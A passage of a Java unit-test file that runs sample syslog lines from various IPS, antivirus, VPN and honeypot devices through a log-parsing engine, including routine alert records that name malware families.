      data = "device_type=ips;device_name=;manufacturers=nsfocus;security_name=app_log;time=1642406016;src_card=T2/1;dst_card=;sip=10.14.14.226;smac=00:23:AE:6D:F1:DC;sport=21;dip=10.14.14.165;dmac=00:1C:23:E0:74:D6;dport=3594;vid=0;module=14;action=17;acted=17;count=1;protocol=tcp;user_name=;policy_id=1;szonename=Monitor;dzonename=;cdnip=;nat_src_ip=;nat_src_port=0;nat_dst_ip=;nat_dst_port=0;comment=;app_name=FTP;app_id=3580009860038659;category=internet;subcategory=file-trans;risk=2;tags=exband|misuse|transfer|tunnel|widely;technology=cs;src_asset=0;dst_asset=0";
      parse(botuEngine, data);
      data = "device_type=\"ips\";manufacturers=\"nsfocus\";hash=\"F594-B803-57EE-1D63\";time=2021-12-29 15:20:05;module=system;type=\"2\";level=\"1\";msg=\"系统规则库 从 5.6.11.23329 版本离线升级失败!\"";
      parse(botuEngine, data);*/
      data = "<1> device_type=ips;device_name=;manufacturers=nsfocus;security_name=app_log;time=1689640778;src_card=G1/1;dst_card=;sip=13.107.42.16;smac=94:04:9C:DA:CA:1A;sport=443;dip=10.5.31.123;dmac=10:51:72:FD:48:63;dport=61312;vid=0;module=14;action=1;acted=1;count=2;protocol=tcp;user_name=;policy_id=1;szonename=Monitor;dzonename=;cdnip=;nat_src_ip=;nat_src_port=0;nat_dst_ip=;nat_dst_port=0;comment=;app_name=SKYPE;app_id=10476146789449728;category=co;subcategory=voip;risk=1;tags=exband|widely;technology=p2p;src_asset=0;dst_asset=0";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAntivirusHg7500() {
    String parserFile = "./resources/parsers/antiVirus_cajinchen_hg7500_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "LOCAL0.NOTICE: mdg gui[3617581]: user=admin ip=192.168.200.50 module=运行状态>>系统状态 op=browse result=浏览";
      parse(botuEngine, data);
      data = "LOCAL0.INFO: mdg cmdline[713020]: [INFO] ssh 192.168.200.50 12543 show int";
      parse(botuEngine, data);
      data = "Mar 23 15:12:20 mdgav mvd[638567]: [ALERT] id=mdg:app time='2022-03-23 15:12:20' fw=mdgav pri=4 dev=br0 vlan=36 srcmac=e4:68:a3:91:2f:e7 dstmac=2c:9d:1e:5c:cf:a7 proto=http src=10.0.100.10:49638 dst=10.0.100.20:240 op=POST url='soft.domain.com:240/uploads/user' fn='test.jpg' size=921 md5=e16265a6997602ddaaa405370c80276e action=quarntn msg='Img.Exploit.CVE_2021_22204-9911806-0' category='Virus File'";
      parse(botuEngine, data);
      data = "Mar 22 22:38:18 mdgav mvd[1076939]: id=mdg:app time='2022-03-22 22:38:18' fw= mdgav pri=4 dev=GE0/3 vlan=36 srcmac=e4:68:a3:91:2f:e7 dstmac=2c:9d:1e:5c:cf:a7 proto=smtp src=10.198.58.31:57771 dst=10.209.133.10:25 srcname=fran@marans.com dstname=sales@mail.com op=POST fn='purchase order 246' size=22551 md5=302d6af53b1c2a075f1bddc8d467c0bd action=alert msg='Html.Phish-PRG' category='Virus File'";
      parse(botuEngine, data);
      data = "Mar 23 09:08:24 mdgav mdg[24527]: [ALERT] id=mdg:flow time='2022-03-23 09:08:24' fw=mdgav pri=0 dev=GE0/3 vlan=36 srcmac=2c:9d:1e:5c:cf:a7 dstmac=e4:68:a3:91:2f:e7 proto=TCP src=10.209.134.195:43581 dst=10.165.213.230:80 rule=2814410 action=alert msg='Win32/TrojanDownloader.Banload.WPF病毒检索Payload活动' category='Trojan Activity'";
      parse(botuEngine, data);
      data = "Mar 22 16:09:54 mdgav mdg[647171]: [ALERT] id=mdg:flow time='2022-03-22 16:09:54' fw=mdgav pri=1 dev=GE0/3 vlan=36 srcmac=e4:68:a3:91:2f:e7 dstmac=2c:9d:1e:5c:cf:a7 proto=TCP src=10.43.58.214:50882 dst=10.209.134.230:7777 rule=2022886 action=alert msg='挖矿程序加密登录通讯' category='Coin Mining Activity'";
      parse(botuEngine, data);
      data = "Mar 23 17:44:42 mdgav mdg[1453689]: [ALERT] id=mdg:flow time='2022-03-23 17:44:42' fw=mdgav pri=4 dev=GE0/3 vlan=36 srcmac=2c:9d:1e:5c:cf:a7 dstmac=e4:68:a3:91:2f:e7 proto=TCP src=10.209.133.135:63233 dst=10.17.244.81:80 rule=2024298 action=alert msg='Wannacry勒索软件_域名请求行为' category='Ransomware Activity'";
      parse(botuEngine, data);
      data = "Mar 23 10:54:27 mdgav mdg[24527]: [ALERT] id=mdg:flow time='2022-03-23 10:54:27' fw=mdgav pri=3 dev=GE0/3 vlan=36 srcmac=e4:68:a3:91:2f:e7 dstmac=2c:9d:1e:5c:cf:a7 proto=TCP src=10.57.82.112:62924 dst=10.209.133.97:23 rule=2404316 action=alert msg='Feodo僵尸网络追踪情报C&C通讯' category='Botnet Activity'";
      parse(botuEngine, data);
      data = "Mar 23 18:31:41 mdgav mdg[1453689]: [ALERT] id=mdg:app time='2022-03-23 18:31:41' fw=mdgav pri=3 dev=GE0/3 vlan=36 srcmac=2c:9d:1e:5c:cf:a7 dstmac=e4:68:a3:91:2f:e7 proto=imap src=10.209.133.68:18936 dst=10.236.118.137:143 auth=login user='username@mail.com.cn' result='fail' action=alert category='Authentication'";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testlbTForce() {
    String parserFile = "./resources/parsers/lb_t1networks_t-force_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<214>Sep 29 23:45:53 host SYSTEM_INFO: SerialNum=001000000000001309109941 GenTime=\"2012-09-29 23:45:53\" Content=\"\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIdsAnySec() {
    String parserFile = "./resources/parsers/ids_anysec_NSIDS-6000-D5283XC[V4.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "%2022-06-27 14:37:36 \"NSFW-12000-F5570\" Cli/LOG_CM/06: 服务方式:Web 用户名:administrator 来源:192.170.5.53 动作:\"获取随机码\" 结果:成功 描述:\"获取随机码成功\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIdsJumpIdp() {
    String parserFile = "./resources/parsers/ids_jump_idp_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<185> 2020-08-25 11:06:15 SECURITY INSTRUCTION type dos系统攻击 id 497 name \"DDOS攻击，TCP协议Syn淹没攻击\" smac 58:69:6C:1A:32:E8 dmac 00:00:5E:00:03:64 prot TCP sip 10.33.3.5 sport 0 dip 112.30.251.11 dport 0 times 1";
      parse(botuEngine, data);
      data = "<167> 2020-08-25 11:06:00 ADMIN CONFIG user admin ip 10.33.1.18 module 日志设置-统一日志 cmd \"用户admin设置统一日志。\" result success";
      parse(botuEngine, data);
      data = "<185> 2011-06-09 10:25:23 jump IPS ADMIN LOGIN user liuyx ip 10.0.7.33 action login result success";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testVpnTopsecVoneSyslog() {
    String parserFile = "./resources/parsers/vpn_topsec_vone[v3.3.010.016.1]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "id=tos time=\"2006-11-02 13:46:50\" fw=WWQ.177 pri=6 type=vpn recorder=vrcd msg=\"There are 0 vrc users online ,include 0 vrc users are active!\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2006-11-02 13:46:09\" fw=TopsecOS pri=5 type=user_auth user=test src=192.168.89.122 op=login result=0 recorder=auth_proxy msg=\"null\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2008-11-10 13:07:26\" fw=HuadunOS pri=6 type=sv_pf src=192.168.95.71 dst=192.168.95.242 user=u op=proxy url=\"http://192.168.95.242/\" result=401 referer=\"(null)\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2008-11-10 13:11:00\" fw=HuadunOS pri=5 type=sv_wf src=192.168.95.71 dst=192.168.1.39 user= op=flow_count rcvd=628 sent=126";
      parse(botuEngine, data);
      data = "id=tos time=\"2008-11-10 14:12:51\" fw=HuadunOS pri=5 type=sv_netacc user=u op=connect src=100.0.0.254 alg_tag=RC4-SHA result=0";
      parse(botuEngine, data);
      data = "id=tos time=\"2008-11-10 13:06:54\" fw=HuadunOS pri=6 type=sv_cifs user=u smbuname=root op=down_file base=/root/sv005/http/libsv_http.so result=0 src=\"libsv_http.so\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2008-11-10 13:03:22\" fw=HuadunOS pri=6 type=sv_system op=login ip=192.168.95.71 user=u session_id=0&1226293396335640 status=0";
      parse(botuEngine, data);
      data = "id=tos time=\"2004-10-22 17:10:11\" fw=wmztest pri=4 type=secure recorder=idskernel src=202.114.2.3 dst=192.168.100.146 msg=\"receve a syn-flood attack for 40000 times.\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2006-11-02 13:45:22\" fw=TopsecOS pri=6 type=pf src=192.168.92.121 dst=192.168.92.255 sport=137 dport=137 smac=00:11:D8:AA:8D:F2 dmac=FF:FF:FF:FF:FF:FF proto=UDP indev=eth0 rule=reject policyid=0 msg=\"null\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2008-03-03 13:58:07\" fw=TopsecOS pri=4 type=avse proto=\"FTP\" subtype=\"virus\" virus=\"Virus.DOS.AntiWin_III.465\" op=\"delete\" fileinfected=\"VS006962_1.rar\" src=\"192.168.89.83\" dst=\"192.168.99.240\" sender=\"null\" receiver=\"null\" subject=\"null\" size=\"2586\" normal_object=\"null\" virus_object=\"null\" msg=\"null\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2006-09-02 15:47:36\" fw=TOPSEC pri=6 type=ac recorder=FW-NAT src=192.168.89.215 dst=192.168.89.121 sport=46136 dport=139 smac=00:13:32:02:2b:a8 dmac=00:11:d8:d6:c3:d8 proto=tcp indev=eth0 outdev=eth1 user= rule=accept connid=302048514 parentid=0 dpiid=0 natid=0 policyid=9178 msg=\"null\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2006-11-02 13:46:09\" fw=TopsecOS pri=5 type=mgmt user=superman src=192.168.89.122 op=\"system version license\" result=0 recorder=config msg=\"null\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2006-09-02 15:47:33\" fw=TOPSEC pri=6 type=conn src=192.168.89.222 dst=192.168.89.255 proto=udp sport=137 dport=137 inpkt=1 outpkt=0 sent=78 rcvd=0 duration=0 connid=302056706 msg=\"null\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2008-02-20 06:06:21\" fw=TopsecOS pri=6 type=dpi recorder=dpi_http proto=TCP user= op=\"GET\" dstname=192.168.99.240 arg=www.asibm.com connid=274186498 policyid=0 msg=\"access allowed\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2006-08-02 07:28:59\" fw=互联网防火墙A pri=6 type=system op=\"RECOVER PROC\" result=0 recorder=recoverd msg=\"recover [auth_proxy] success\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testVpnTopsecSSLVPNSyslog() {
    String parserFile = "./resources/parsers/vpn_topsec_sslvpn_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "id=\"NGTOS\" version=\"v3.2000a5.57.sw-4\" time=\"2018-08-29 14:19:44\" dev=\"TopsecOS\" pri=\"information\" type=\"ipsec vpn ddns log\" recorder=\"ipsec ddns\" vsid=\"0\" domain=\"www.123.com.free.ezvpn.cn\" rigster_ifname=\"feth0\" ddnssrv1=\"server.ezvpn.cn\" ddnssrv2=\"\" msg=\" register domain success.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.0058_NGVONE.1_haveroot\" time=\"2020-04-10 14:24:26\" dev=\"TopsecOS\" pri=\"information\" type=\"ipsec vpn vdc log\" recorder=\"ipsec vdcd\" vsid=\"0\" tpaddr=\"192.168.1.100\" domain=\"www.123.com\" notifyaddr=\"192.168.1.100\" tunnel_name=\"-\" dev_prio=\"1\" line_prio=\"11\" subnet_num=\"-\" dev_num=\"-\" tunnel_num=\"-\" detail_num=\"-\" msg=\" Vdcd register to TP OK.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.0058_NGVONE.1_haveroot\" time=\"2020-04-10 14:30:13\" dev=\"TopsecOS\" pri=\"information\" type=\"ipsec vpn linkd log\" recorder=\"ipsec linkd\" vsid=\"0\" ifname=\"ipsec0\" phyifname=\"feth0\" msg=\"link up\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.57.sw-4\" time=\"2020-04-10 14:19:44\" dev=\"TopsecOS\" pri=\"information\" type=\"ipsec vpn other log\" recorder=\"other\" vsid=\"0\" msg=\" Send sync check request ack ok.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.57.sw-4\" time=\"2020-04-10 14:19:44\" dev=\"TopsecOS\" pri=\"information\" type=\"ipsec vpn tunnel operate log\" recorder=\"ipsec tunnel operate\" vsid=\"0\" tunnel_name=\"test\" action=\"add\" msg=\"add tunnel to pluto succeed.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.0058_NGVONE.1_haveroot\" time=\"2020-04-10 14:24:26\" dev=\"TopsecOS\" pri=\"information\" type=\"ipsec vpn negotiate log\" recorder=\"ipsec negotiate\" vsid=\"0\" tunnel_name=\"test\" action=\"negotiate\" srcip=\"172.19.1.23\" dstip=\"172.19.1.24\" srcsubnet=\"30.1.1.0/24\" dstsubnet=\"111.1.1.0/24\" sa=\"-\" sp=\"-\" p1_authalg=\"MD5\" p1_encalg=\"AES_CBC\" p2_authalg=\"HMAC_MD5\" p2_encalg=\"ESP_AES\" msg=\"Tunnel established.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.0058_NGVONE.1\" time=\"2020-04-10 11:44:34\" dev=\"TopsecOS\" pri=\"information\" type=\"pki-operate-log\" recorder=\"pki\" vsid=\"0\" commonname=\"123\" filepath=\"-\" fileformat=\"PEM\" result=\"success\" cause=\"-\" msg=\"crate localca client success\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.0058_NGVONE.1\" time=\"2020-04-10 14:33:21\" dev=\"TopsecOS\" pri=\"information\" type=\"sslvpn-system-log\" recorder=\"sslvpn system\" vsid=\"0\" user=\"1^default^root\" ip=\"169.254.122.1\" dst=\"127.0.0.1\" uri=\"/vone/login/user_pswd\" is_vip_user=\"no\" idle_timeout=\"3600\" force_logout_time=\"0\" multi_login_switch=\"on\" plugin_switch=\"on\" plugin_install=\"-\" crypt_card=\"no\" compress=\"no\" msg=\"login by password success\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.0058_NGVONE.1\" time=\"2020-04-10 14:53:11\" dev=\"TopsecOS\" pri=\"information\" type=\"wf-log\" recorder=\"sslvpn wf\" v sid=\"0\" user=\"-\" src=\"169.254.122.77\" dst=\"-\" sport=\"8991\" dport=\"40943\" op=\"wf\" send_bytes=\"711601\" rcv_bytes=\"0\" result=\"200\" referer=\"https://169.254.122.77/portal_default/vone/portal/index.html\" url=\"/svwebproxy/0/http/192.168.67.113\" msg=\"web forward success.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.0058_NGVONE.1\" time=\"2020-04-10 11:44:34\" dev=\"TopsecOS\" pri=\"error\" type=\"alarm-log\" recorder=\"sslvpn alarm\" vsid=\"0\" subtype=\"5\" english_msg=\"user 1 login failed,client version is \" chinese_msg=\"用户1 登录失败,客户端版本号是\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.0058_NGVONE.1\" time=\"2020-04-10 14:45:42\" dev=\"TopsecOS\" pri=\"information\" type=\"na-log\" recorder=\"sslvpn na\" vsid=\"0\" user=\"1^default^root\" src=\"169.254.122.1\" dst=\"0.0.0.0\" sport=\"0\" dport=\"0\" op=\"new tunnel\" send_bytes=\"0\" rcv_bytes=\"448\" virtual_ip=\"10.10.0.1\" subnet=\"255.255.255.0\" work_mode=\"isolate\" acl_num=\"1\" msg=\"logout success\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.0058_NGVONE.1\" time=\"2020-04-10 11:44:34\" dev=\"TopsecOS\" pri=\"information\" type=\"user-auth-login\" recorder=\"aaaa\" vsid=\"0\" user=\"1\" authgene=\"password\" ip=\"169.254.122.1\" authserver=\"localdb\" authproto=\"localdb\" clienttype=\"SV CLIENT\" msg=\"password error\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.0058_NGVONE.1\" time=\"2020-04-10 11:44:34\" dev=\"TopsecOS\" pri=\"information\" type=\"virus-operate-log\" recorder=\"aaaa\" vsid=\"0\" user=\"1\" ip=\"169.254.122.1\" client_version=\"3.4.1.13\" virus_type=\"Virus/DOS.Ezboot\" virus_file=\"D:\\d\\b.zip\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2000a5.0058_NGVONE.1\" time=\"2020-04-10 14:58:15\" dev=\"TopsecOS\" pri=\"information\" type=\"webalize-log\" recorder=\"sslvpn webalize\" vsid=\"0\" user=\"-\" src=\"169.254.122.77\" dst=\"127.0.0.1\" sport=\"8991\" dport=\"0\" op=\"open/download\" send_bytes=\"57\" rcv_bytes=\"26\" smb_user_name=\"topsec\" smb_user_pwd=\"123456\" msg=\"webalize resource login success\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testHoneyPotTopsecTopHPPSyslog() {
    String parserFile = "./resources/parsers/honeypot_topsec_tophpp[v1]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "type=alert_collect,timestamp=2019-09-12 10:53:44,severity=Low,attack_type=AbnormalBehavior,attack_brief=Elasticsearch,sip=172.21.3.150,sport=38367,dip=192.168.122.2,dport=9200,protocol=udp,cve_id=123123";
      parse(botuEngine, data);
      data = "type=alert_collect,timestamp=2019-09-12 10:53:44,severity=High,attack_type=AbnormalBehavior,attack_brief=Redis,sip=172.21.3.150,sport=38367,dip=192.168.122.2,dport=9200,protocol=udp,cve_id=123";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testHoneyPotTopsecTopHPPV3Syslog() {
    String parserFile = "./resources/parsers/honeypot_topsec_tophpp[v3]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "type=alert_collect,timestamp=2019-09-12 10:53:44,severity=Low,attack_type=33AbnormalBehavior22,attack_brief=Elasticsearch,sip=172.21.3.150,sport=38367,dip=192.168.122.2,dport=9200,protocol=udp,cve_id=123123";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIpsVenusNipsSyslog() {
    String parserFile = "./resources/parsers/ips_venus_nips[v6]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<205>Feb 23 10:46:48 ips AV: SerialNum=0113251411269999 GenTime=\"2020-07-11 10:46:48\" SrcIP=112.5.254.117 SrcIP6= SrcIPVer=4 DstIP=192.168.13.47 DstIP6= DstIPVer=4 Protocol=TCP SrcPort=80 DstPort=59007 InInterface=ge0/2 OutInterface=ge0/1 SMAC=00:10:f3:fa:0d:80 DMAC=68:f7:28:97:8f:5d FwPolicyID=6 ProtocolID=10 ProtocolType=http VirusName=BlockFile Action=BLOCK VirusFileName=Visio2007.rar Content=\"file is blocked\" EvtCount=1";
      parse(botuEngine, data);
      data = "<212>Oct 29 11:50:51 ips IPS: SerialNum=0113201403099999 GenTime=\"2014-10-29 11:50:51\" SrcIP=192.168.38.28 SrcIP6= SrcIPVer=4 DstIP=82.244.22.168 DstIP6= DstIPVer=4 Protocol=UDP SrcPort=58380 DstPort=16464 InInterface=ge0/3 OutInterface=ge0/4 SMAC=00:0c:29:bb:28:60 DMAC=00:17:df:ba:4c:00 FwPolicyID=6 EventName=UDP_Trojan.Malagent_连接 EventID=152340118 EventLevel=2 EventsetName=all SecurityType=木马后门 SecurityID=5 ProtocolType=UDP ProtocolID=5 Action=PASS Vsysid=0 Content=\"\" CapToken= EvtCount=1";
      parse(botuEngine, data);
      data = "<237>Jan 28 16:21:18 ips P2P_EVENT: SerialNum=0113251411269999 GenTime=\"2016-01-28 16:21:18\" SrcIP=192.168.13.217 SrcIP6= SrcIPVer=4 DstIP=61.135.253.204 DstIP6= DstIPVer=4 Protocol=TCP SrcPort=52542 DstPort=80 InInterface=ge0/1 OutInterface=ge0/2 P2PName=HTTP_P2P_software_wp.163.com_file_downloading FwPolicyID=6 Content=\"file transfer blocked\" EvtCount=1";
      parse(botuEngine, data);
      data = "<301>Jan 28 16:27:15 ips WEB_FILTER: SerialNum=0113251411269999 GenTime=\"2016-01-28 16:27:15\" SrcIP=192.168.13.47 SrcIP6= SrcIPVer=4 DstIP=180.149.144.216 DstIP6= DstIPVer=4 Protocol=TCP SrcPort=50213 DstPort=80 InInterface=ge0/1 OutInterface=ge0/2 FwPolicyID=6 Action=Accept URL=tieba.baidu.com; Content=\"WEB_CONTENT_FILTER*: The packet was filtered,because it includes Cookie.\" EvtCount=1";
      parse(botuEngine, data);
      data = "<309>Jan 30 12:06:01 ips MAIL_FILTER: SerialNum=0113251411269999 GenTime=\"2016-01-30 12:06:01\" SrcIP=192.168.13.173 SrcIP6= SrcIPVer=4 DstIP=106.39.10.168 DstIP6= DstIPVer=4 Protocol=TCP SrcPort=53089 DstPort=25 InInterface=ge0/1 OutInterface=ge0/2 FwPolicyID=6 Action=Deny MailSender=bai_jianchao@venustech.com.cn Content=\"subject test not allowed\" EvtCount=1";
      parse(botuEngine, data);
      data = "<318>Feb 23 19:51:34 ips FILTER: SerialNum=0113251411269999 GenTime=\"2016-02-23 19:51:34\" SrcIP=192.168.13.38 SrcIP6= SrcIPVer=4 DstIP=192.168.14.190 DstIP6= DstIPVer=4 Protocol=TCP SrcPort=4022 DstPort=80 InInterface=ge0/1 OutInterface=ge0/2 FwPolicyID=1 Action=DENY Content=\"POLICY*: The packet was blocked because the NIPS policy is deny\" EvtCount=1";
      parse(botuEngine, data);
      data = "<325>Jan 30 10:47:35 ips NAT: SerialNum=0112031501109999 GenTime=\"2016-01-30 10:47:35\" SrcIP=192.168.13.217 SrcIP6= SrcIPVer=4 DstIP=192.168.13.244 DstIP6= DstIPVer=4 SrcPort=52380 DstPort=21 NatType=\"Destination NAT\" BeforeTransAddr=192.168.13.244 BTAddr6= BTAddrVer=4 AfterTransAddr=172.16.1.172 ATAddr6= ATAddrVer=4 Protocol=TCP BeforeTransPort=21 AfterTransPort=21 Content=\"\" EvtCount=1";
      parse(botuEngine, data);
      data = "<341>Jan 28 15:45:56 ips HA: SerialNum=0113251411269999 GenTime=\"2016-01-28 15:45:56\" Action=\"backup-master :Init2 to Master \" Content=\"init timeout : has no neighbour\" EvtCount=1";
      parse(botuEngine, data);
      data = "<358>Jan 28 15:53:13 ips RUN_INFO: SerialNum=0113251411269999 GenTime=\"2016-01-28 15:53:13\" CpuUsage=3.53   MemoryUsage=25.11 SessionNum=885 HalfSessionNum=564  Eth1Band=2000000 Eth2Band=0 Eth3Band=0 Eth4Band=0 Sysbps=4212 Content=\"operation success\" EvtCount=1";
      parse(botuEngine, data);
      data = "<365>Jan 28 15:56:10 ips SYSTEM_INFO: SerialNum=0113251411269999 GenTime=\"2016-01-28 15:56:10\" Content=\"The version [20160126] of AV is latest\" EvtCount=1";
      parse(botuEngine, data);
      data = "<372>Jan 28 15:48:11 ips WARNING_INFO: SerialNum=0113251411269999 GenTime=\"2016-01-28 15:48:11\" Content=\"SessionNum=958\" EvtCount=1";
      parse(botuEngine, data);
      data = "<381>Jan 28 15:40:06 ips IF_INFO: SerialNum=0113251411269999 GenTime=\"2016-01-28 15:40:06\" Content=\"interface ge0/2 linkdown\" EvtCount=1";
      parse(botuEngine, data);
      data = "<414>Jan 30 11:02:22 ips OSPF: SerialNum=0112031501109999 GenTime=\"2016-01-30 11:02:22\" SrcIP= SrcIP6= SrcIPVer= InterfaceName=ge0/1 InterfaceAddr=192.168.13.215 NBRRouterID=192.168.13.244 EventHappen=1-WayReceived OldState=Full NewState=Init Content=\"NSM:State change Full -> Init\" EvtCount=1";
      parse(botuEngine, data);
      data = "<430>Jan 28 15:20:32 ips QOS: SerialNum=0113251411269999 GenTime=\"2016-01-28 15:20:32\" SrcIP=192.168.13.20 SrcIP6= SrcIPVer=4 DstIP=61.135.185.216 DstIP6= DstIPVer=4 Protocol=6 SrcPort=32839 DstPort=80 InInterface=ge0/1 OutInterface=ge0/2 FwPolicyID=6 Content=\"QoS*: Traffic Shapping stopped! MaxBandwidth:80000000\" EvtCount=1";
      parse(botuEngine, data);
      data = "<461>Jan 28 15:11:13 ips STOCK: SerialNum=0113251411269999 GenTime=\"2016-01-28 15:11:13\" SrcIP=192.168.13.217 SrcIP6= SrcIPVer=4 DstIP=111.207.232.131 DstIP6= DstIPVer=4 Protocol=TCP SrcPort=50872 DstPort=80 InInterface=ge0/1 OutInterface=ge0/2 STOCKName=HTTP_股票软件_巨潮资讯网_查看信息 EventID=152522881 Action=Blocked Content=\"file transfer blocked\" EvtCount=1";
      parse(botuEngine, data);
      data = "<469>Feb 24 17:09:59 ips GAME: SerialNum=0113251411269999 GenTime=\"2016-02-24 17:09:59\" SrcIP=192.168.13.47 SrcIP6= SrcIPVer=4 DstIP=183.60.56.84 DstIP6= DstIPVer=4 Protocol=UDP SrcPort=49468 DstPort=8000 InInterface=ge0/1 OutInterface=ge0/2 GAMEName=UDP_网络游戏_QQ游戏_连接服务器 EventID=152340036 Action=Blocked Content=\"file transfer blocked\" EvtCount=1";
      parse(botuEngine, data);
      data = "<493>Jan 30 11:54:21 ips VOIP: SerialNum=0112031501109999 GenTime=\"2016-01-30 11:54:21\" SrcIP=1.1.233.0 SrcIP6= SrcIPVer=4 DstIP=1.2.235.177 DstIP6= DstIPVer=4 Protocol=UDP SrcPort=26717 DstPort=1719 InInterface=ge0/4 OutInterface=ge0/3 VOIPName=H323 FwPolicyID=1 Action=DROP Content=\"\" EvtCount=1";
      parse(botuEngine, data);
      data = "<501>Jan 28 14:31:23 ips SMEDIA: SerialNum=0113251411269999 GenTime=\"2016-01-28 14:31:23\" SrcIP=192.168.13.172 SrcIP6= SrcIPVer=4 DstIP=218.58.222.32 DstIP6= DstIPVer=4 Protocol=TCP SrcPort=42157 DstPort=80 InInterface=ge0/1 OutInterface=ge0/2 SMEDIAName=流媒体_腾讯视频/QQ音乐_在线播放 EventID=152519242 Action=Blocked Content=\"file transfer blocked\" EvtCount=1";
      parse(botuEngine, data);
      data = "<406>Jan 28 15:20:32 ips SESSION: SerialNum=0113251411269999 GenTime=\"2016-01-28 15:20:32\" SrcIP=192.168.13.20 SrcIP6= SrcIPVer=4 DstIP=61.135.185.216 DstIP6= DstIPVer=4 Protocol=TCP SrcPort=32879 DstPort=80 Content=\"Session Setup\" EvtCount=1";
      parse(botuEngine, data);
      data = "<220>Feb 23 18:39:56 ips ATTACK: SerialNum=0113251411269999 GenTime=\"2016-02-23 18:39:56\" SrcIP=192.168.13.8 SrcIP6= SrcIPVer=4 DstIP=74.125.23.139 DstIP6= DstIPVer=4 Protocol=TCP SMAC=f0:de:f1:49:54:eb DMAC=00:10:f3:fa:0d:80 InInterface=ge0/1 OutInterface=ge0/2 Content=\"source reached TCP session limit:10\" EvtCount=1";
      parse(botuEngine, data);
      data = "<396>Jan 30 15:24:52 ips SCAN: SerialNum=0113251411269999 GenTime=\"2016-01-30 15:24:52\" SrcIP=192.168.13.249 SrcIP6= SrcIPVer=4 InInterface=ge0/1 Content=\"Packet is blocked\" EvtCount=1";
      parse(botuEngine, data);
